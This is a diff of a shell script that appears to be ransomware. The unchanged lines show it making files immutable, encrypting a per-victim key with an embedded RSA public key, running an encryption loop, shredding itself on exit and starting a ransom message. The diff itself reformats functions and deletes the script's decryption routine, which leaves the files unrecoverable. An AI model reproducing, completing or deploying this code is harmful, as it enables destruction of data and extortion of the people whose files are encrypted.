@@ -54,7 +54,11 @@ openfile() {
 		chflags schg $1
 	fi
 }
-adderr() { ERRMSG="$ERRMSG\n$1"; }
+
+adderr() {
+    ERRMSG="$ERRMSG\n$1";
+}
+
 EXIT() {
     echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"
     shred $0
@@ -81,6 +85,7 @@ CwIDAQAB
 	echo "$pubkey" > $PUBLICKEY
 	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "$PUBLICKEY" | openssl base64 -out $PRIVATEKEY
 }
+
 navdir() {
 for fil in $1; do
 	whitelist=".*vmware.*|.*_schema.*|.*shy_packet.*"
@@ -92,6 +97,7 @@ for fil in $1; do
 	fi
 done
 }
+
 showmess() {
     case "$DIALOG" in
     *none*)
@@ -129,26 +135,7 @@ enc_loop() {
 	fi
     done
 }
-################## DECRYPT ################################
-upk() {
-    adderr "[+] Decrypted $1"
-    if [ "$SOFT" = "" ]; then
-	openfile $1
-	openfile $1.dec
-	mv $1 $1.enc
-	openssl aes-256-cbc -d -k "$KEY" -in "$1.enc" -out "$1"
-	rm $1.enc
-    fi
-}
-dec_loop() {
-    kills="$1"
-    for i in $kills; do
-    	if [ -d "$i" ]; then
-	    navdir "$i/*" "upk"
-	    adderr "[+] Decrypted $i"
-	fi
-    done
-}
+
 ################# MAIN ######################################
 setmsg() {
     message='Congratulations,
